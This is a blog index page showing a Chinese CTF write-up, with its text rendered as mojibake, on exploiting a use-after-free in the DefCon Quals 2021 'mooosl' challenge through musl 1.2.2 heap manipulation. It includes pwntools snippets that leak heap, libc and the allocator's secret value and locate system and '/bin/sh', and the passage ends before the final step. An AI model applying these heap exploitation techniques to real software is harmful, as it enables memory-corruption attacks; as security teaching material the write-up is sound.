<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/10/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/10/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/" class="post-title-link" itemprop="url">musl pwn å…¥é—¨ (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:42:38" itemprop="dateCreated datePublished" datetime="2023-02-28T22:42:38+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ ç¬”è®°</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn ç³»åˆ—</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>9.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>åœ¨å‰é¢çš„ä»‹ç»ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ äº†musl pwnçš„åŸºæœ¬åŸç†ï¼Œä¸‹é¢æˆ‘ä»¬å°±é€šè¿‡ä¸€é“ç»å…¸ä¾‹é¢˜è¿›ä¸€æ­¥å·©å›ºã€‚</p>
<p>è¿™æ˜¯DefCon Quals 2021ä¸­çš„ä¸€é“é¢˜moooslï¼Œç›´æ¥åœ¨githubä¸Šæœè¿™é“é¢˜çš„åå­—å°±å¯ä»¥æ‰¾åˆ°ä½œè€…å‘å¸ƒçš„é™„ä»¶ï¼Œå†…å«è¯´æ˜ã€ä½œè€…çš„expã€æºç ä»¥åŠäºŒè¿›åˆ¶ç¨‹åºã€‚</p>
<p>æ³¨ï¼šæˆ‘æœ¬æ¥ä»¥ä¸ºé¢˜ç›®ç»™çš„musl 1.2.2çš„libcå’Œè‡ªå·±æœºå­ä¸Šé¢çš„ä¸€æ ·ï¼Œç»“æœå‘ç°å·®å¾—å¤ªè¿œäº†ï¼Œç™½èŠ±äº†æˆ‘å¤§åŠå¤©æ—¶é—´ã€‚ğŸ˜­</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241104#h2-3">å‚è€ƒæ–‡ç« </a></p>
<h1 id="1-é€†å‘åˆ†æ"><a class="markdownIt-Anchor" href="#1-é€†å‘åˆ†æ"></a> 1. é€†å‘åˆ†æ</h1>
<p>è¿™æ˜¯ä¸€ä¸ªèœå•é¢˜ï¼ŒåŒ…å«ä¸‰ç§æ“ä½œstoreã€queryå’Œdeleteï¼Œç»è¿‡é€†å‘åˆ†æä¹‹åå¯ä»¥çŸ¥é“è¿™ä¸ªèœå•é¢˜çš„æ•°æ®ç»“æ„é€»è¾‘ã€‚<strong>ç¨‹åºä¸­æœ‰ä¸€æ®µ0x8000å¤§å°çš„ç©ºé—´hashmapï¼Œå¯ä»¥ä¿å­˜0x1000ä¸ªæŒ‡é’ˆã€‚è¿™ä¸ªæŒ‡é’ˆæ˜¯ä½œè€…å®šä¹‰çš„ç»“æ„ä½“ï¼Œç»“æ„ä½“ä¸­åŒ…å«æœ‰ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ†åˆ«ä¸ºkeyå’Œvalueã€‚è¿›è¡Œstoreæ“ä½œæ—¶ï¼Œé¦–å…ˆè¾“å…¥keyï¼Œç„¶åç¨‹åºä½¿ç”¨ä¸€ä¸ªå‡½æ•°è®¡ç®—å…¶å“ˆå¸Œå€¼ï¼ˆ0-0xFFFï¼‰ï¼Œè¿™ä¸ªå“ˆå¸Œå€¼å°±æ˜¯è¿™ä¸ªç»“æ„ä½“éœ€è¦ä¿å­˜åˆ°hashmapä¸­çš„ç´¢å¼•ã€‚å¦‚æœæœ‰ä¸¤ä¸ªkeyçš„å“ˆå¸Œå€¼ç›¸åŒï¼Œåˆ™ç¬¬äºŒæ¬¡storeè·å–çš„ç»“æ„ä½“å°±ä¼šæˆä¸ºhashmapä¸­çš„é“¾é¦–ï¼Œç»“æ„ä½“ä¸­è¿˜æœ‰ä¸€ä¸ªæŒ‡é’ˆç”¨äºå½¢æˆé“¾è¡¨ï¼Œç¬¬ä¸€æ¬¡storeçš„ç»“æ„ä½“çš„åœ°å€å°±ä¿å­˜åœ¨ç¬¬äºŒæ¬¡storeçš„ç»“æ„ä½“ä¹‹ä¸­ã€‚queryåˆ™æ˜¯æ ¹æ®è¾“å…¥çš„keyå€¼è®¡ç®—å‡ºå“ˆå¸Œå€¼å¯¹åº”çš„ç»“æ„ä½“å¹¶è¾“å‡ºã€‚deleteä¼šå°†æ‰¾åˆ°çš„ç»“æ„ä½“ç§»å‡ºhashmapã€‚</strong></p>
<p>æœ¬é¢˜çš„æ¼æ´åœ¨deleteå‡½æ•°ä¸­ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/cbb4c310bd414edcb3f3ea06674157fc.png" alt="ç»“æ„ä½“çš„å£°æ˜" /></p>
<p><img src="1.png" alt="" /></p>
<p>æ³¨æ„deleteä¸­çš„ifè¯­å¥ï¼Œè¿™ä¸ªifè¯­å¥å†…éƒ¨çš„åŠŸèƒ½æ˜¯ä»hashmapä¸­ç§»å‡ºç»“æ„ä½“å®ä¾‹ï¼Œp_chainå°±æ˜¯hashmapä¸­çš„åœ°å€ã€‚ä½†è¿™é‡Œæœ‰ä¸€ç§æƒ…å†µæ²¡æœ‰è€ƒè™‘ï¼šå½“è¦åˆ é™¤çš„ç»“æ„ä½“ä½äºé“¾å°¾æ—¶ï¼Œifè¯­å¥çš„ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸ä¼šæ»¡è¶³ï¼Œè¿™æ ·è¿™ä¸ªç»“æ„ä½“å°±ä¸ä¼šä»é“¾è¡¨ä¸­åˆ é™¤ï¼Œè€Œæ˜¯ç•™åœ¨å…¶ä¸­ã€‚è¿™å°±ä¸ºæˆ‘ä»¬UAFåˆ›é€ äº†æ¡ä»¶ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡å †æ’å¸ƒæ“ä½œè®©å¦ä¸€ä¸ªç»“æ„ä½“çš„valueåœ°å€ç­‰äºè¿™ä¸ªå·²ç»è¢«åˆ é™¤çš„ç»“æ„ä½“åœ°å€ï¼Œé‚£ä¹ˆé€šè¿‡queryæˆ‘ä»¬å°±èƒ½å¤Ÿè·å–åˆ°è¿™ä¸ªç»“æ„ä½“ä¸­çš„å†…å®¹ï¼Œå…¶ä¸­åŒ…å«å¤šä¸ªæŒ‡é’ˆçš„åœ°å€ã€‚</p>
<h1 id="2-è§£é¢˜ç¬¬ä¸€æ­¥æ³„éœ²ä¿¡æ¯"><a class="markdownIt-Anchor" href="#2-è§£é¢˜ç¬¬ä¸€æ­¥æ³„éœ²ä¿¡æ¯"></a> 2. è§£é¢˜ç¬¬ä¸€æ­¥â€”â€”æ³„éœ²ä¿¡æ¯</h1>
<p>æˆ‘ä»¬å†æ¥å›é¡¾ä¸€ä¸‹<code>free</code>å‡½æ•°çš„æµç¨‹ï¼š<code>free</code>çš„é‡ç‚¹åœ¨äº<code>nontrivial_free</code>ï¼Œæ³¨æ„ä¸‹é¢çš„ä»£ç ç‰‡æ®µï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (freeå‡½æ•°çš„ä¸€ä¸ªç‰‡æ®µ)</span></span><br><span class="line">	wrlock();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line">		<span class="type">int</span> e = errno;</span><br><span class="line">		munmap(mi.base, mi.len);</span><br><span class="line">		errno = e;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (nontrivial_freeå‡½æ•°çš„ä¸€ä¸ªç‰‡æ®µ)</span></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (free_groupä¸­çš„ä¸€ä¸ªç‰‡æ®µ)</span></span><br><span class="line">	<span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">		step_seq();</span><br><span class="line">		record_seq(sc);</span><br><span class="line">		mi.base = g-&gt;mem;</span><br><span class="line">		mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br></pre></td></tr></table></figure>
<p>å½“ä¸€ä¸ªgroupä¸­æ‰€æœ‰çš„chunkå‡è¢«é‡Šæ”¾æ—¶ï¼Œåœ¨é‡Šæ”¾æœ€åä¸€ä¸ªchunkæ—¶ä¼šè°ƒç”¨åˆ°<code>free_group</code>å‡½æ•°å°†groupé‡Šæ”¾ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸å¸Œæœ›çœ‹åˆ°çš„ï¼Œå› æ­¤åœ¨å †æ’å¸ƒçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸åº”è¯¥è®©ä¸€ä¸ªmetaä¸­çš„æ‰€æœ‰chunkåœ¨æŸä¸€æ—¶åˆ»å…¨éƒ¨è¢«é‡Šæ”¾ã€‚</p>
<p>å¦å¤–æ³¨æ„åˆ°ï¼Œ<code>malloc</code>å‡½æ•°åœ¨é€‰æ‹©chunkæ—¶ä¸ä¼šå»é€‰æ‹©åˆšåˆšè¢«<code>free</code>çš„chunkï¼Œå› ä¸ºæ­¤æ—¶ä»£è¡¨è¯¥chunkçš„bitåªåœ¨<code>freed_mask</code>ä¸­ä¸º1ï¼Œåœ¨<code>avail_mask</code>ä¸­ä¸º0ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">activate_group</span><span class="params">(<span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!m-&gt;avail_mask);</span><br><span class="line">	<span class="type">uint32_t</span> mask, act = (<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">do</span> mask = m-&gt;freed_mask;</span><br><span class="line">	<span class="keyword">while</span> (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span><br><span class="line">	<span class="keyword">return</span> m-&gt;avail_mask = mask &amp; act;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€Œ<code>activate_group</code>å‡½æ•°åˆ™å¯ä»¥å°†<code>free_mask</code>ä¸­çš„æ‰€æœ‰chunkå˜ä¸º<code>avail_mask</code>ã€‚è¿™ä¸ªå‡½æ•°è§¦å‘çš„æ¡ä»¶æ˜¯ï¼š<strong>è¿™ä¸ªgroupçš„<code>avail_mask</code>ä¸º0ï¼Œè¯¥groupä¸­ä¸æ˜¯è¢«freeçš„chunkå°±æ˜¯æ­£åœ¨ä½¿ç”¨çš„chunk</strong>ã€‚å› æ­¤ï¼Œæƒ³è¦åˆ†é…åˆ°å·²ç»è¢«freeçš„ç»“æ„ä½“æ‰€åœ¨çš„chunkï¼Œå°±åº”è¯¥é¦–å…ˆè®©è¿™ä¸ªgroupä¸­çš„chunkå…¨éƒ¨è¢«åˆ†é…ä¸€æ¬¡ã€‚</p>
<p>è€ƒè™‘åˆ°æœ¬é¢˜ä½¿ç”¨çš„æ˜¯<code>calloc</code>è€Œä¸æ˜¯<code>malloc</code>ï¼Œå› æ­¤å †æ’å¸ƒçš„ç›®æ ‡åº”è¯¥æ˜¯è®©ä¸€ä¸ªç»“æ„ä½“çš„valueæŒ‡å‘å¦ä¸€ä¸ªç»“æ„ä½“ï¼Œè€Œä¸”ä¸èƒ½åˆ†é…åˆ°åŸæ¥ç»“æ„ä½“æ‰€åœ¨çš„chunkã€‚å¯è¡Œçš„æ–¹æ³•æ˜¯ï¼š</p>
<ul>
<li>Step 1: åˆ†é…ç¬¬1ä¸ªstorageç»“æ„ä½“</li>
<li>Step 2: è¿›è¡Œå †ç©ºé—´æ’å¸ƒ</li>
<li>Step 3: åˆ†é…ç¬¬2ä¸ªstorageç»“æ„ä½“ä½¿å¾—storageç»“æ„ä½“æœ¬èº«ä½äºå…¶valueçš„åé¢</li>
<li>Step 4: deleteç¬¬2ä¸ªstorage</li>
<li>Step 5: åˆ†é…ç¬¬3ä¸ªstorageç»“æ„ä½“ä½¿å¾—è¿™ä¸ªç»“æ„ä½“çš„chunkå°±æ˜¯ç¬¬2ä¸ªstorageçš„value</li>
<li>Step 6: å¯¹ç¬¬2ä¸ªstorageè°ƒç”¨queryä»¥è·å¾—ç¬¬3ä¸ªstorageç»“æ„ä½“ä¸­çš„æŒ‡é’ˆç­‰</li>
</ul>
<p>è¿™é‡Œéœ€è¦è¿›è¡Œè®¡ç®—ï¼Œè®©ä¸¤ä¸ªä¸åŒçš„keyå€¼å…·æœ‰ç›¸åŒçš„å“ˆå¸Œå€¼ï¼Œè¿™ä¸ªä¸éš¾å®ç°ï¼Œå› ä¸ºæœ€ç»ˆç»“æœæ˜¯12æ¯”ç‰¹ï¼Œç©·ä¸¾å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸Šé¢çš„ä»£ç ç‰‡æ®µæ‰€ç¤ºï¼Œå³å¯é€šè¿‡queryæ“ä½œæ‰“å°å‡ºæœ€åä¸€ä¸ªstoreåˆ›å»ºçš„ç»“æ„ä½“çš„ä¿¡æ¯ã€‚æœ€åä¸€ä¸ªstoreçš„valueåœ°å€å°±åœ¨å½“å‰çš„groupä¸­ï¼Œæ ¹æ®è¿™ä¸ªå€¼å¯ä»¥è·å–è¯¥groupçš„åœ°å€ã€‚æ³¨æ„è¿™é‡Œçš„æœ€åä¸€æ¬¡storeåˆ†é…äº†ä¸€ä¸ªå¤§ç©ºé—´ï¼Œè¿™ä¼šè®©muslåœ¨libcåœ°å€æ­£ä¸‹æ–¹mmapä¸€å—ç©ºé—´ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€è·å–åˆ°libcçš„åŸºåœ°å€ã€‚åœ¨æ­¤ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦é‡å¤åœ°é€šè¿‡queryæ“ä½œä¿®æ”¹ç¬¬äºŒæ¬¡storeè·å¾—çš„storageä¸­çš„valueåœ°å€ï¼Œå³å¯å®ç°ä»»æ„åœ°å€è¯»ã€‚å› ä¸ºæ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ ¹æ®è·å–çš„ä¸¤ä¸ªåœ°å€æ¨å¯¼å‡ºç¬¬äºŒä¸ªstorageä¸­çš„å…³é”®å­—æ®µçš„å€¼ã€‚åœ¨ç¬¬ä¸€æ¬¡leakä¹‹åï¼Œ7ä¸ªchunkç´¢å¼•ä»é«˜åˆ°ä½çš„çŠ¶æ€åº”è¯¥ä¾æ¬¡ä¸ºï¼šAAAAUUUï¼ˆAå¯ç”¨ï¼ŒUæ­£ç”¨ï¼ŒFé‡Šæ”¾ï¼‰ï¼Œå…¶ä¸­ç¬¬7ä¸ªæ˜¯ç¬¬äºŒä¸ªstorageç»“æ„ä½“ä¿å­˜çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆç”¨3ä¸ªæ— æ•ˆçš„queryè®©çŠ¶æ€å˜ä¸ºAFFFUUUï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨queryæ“ä½œæ¥ä¿®æ”¹ç¬¬äºŒä¸ªstorageç»“æ„ä½“çš„å€¼ï¼Œæœ€åå†ä¸€æ¬¡queryè¿›è¡Œä»»æ„å†™ã€‚</p>
<p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°<code>meta_area</code>çš„<code>secret</code>å€¼ï¼Œlibcçš„åŸºåœ°å€ç­‰å…³é”®ä¿¡æ¯ï¼Œä¹‹åå°±è¦å¼€å§‹ä½¿ç”¨unlinkè¿›è¡Œåˆ©ç”¨äº†ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1 id="3-è§£é¢˜ç¬¬äºŒæ­¥ä¼ªé€ file-meta-groupç­‰ç»“æ„å¹¶åˆ©ç”¨"><a class="markdownIt-Anchor" href="#3-è§£é¢˜ç¬¬äºŒæ­¥ä¼ªé€ file-meta-groupç­‰ç»“æ„å¹¶åˆ©ç”¨"></a> 3. è§£é¢˜ç¬¬äºŒæ­¥ï¼šä¼ªé€ <code>FILE</code>ã€<code>meta</code>ã€<code>group</code>ç­‰ç»“æ„å¹¶åˆ©ç”¨</h1>
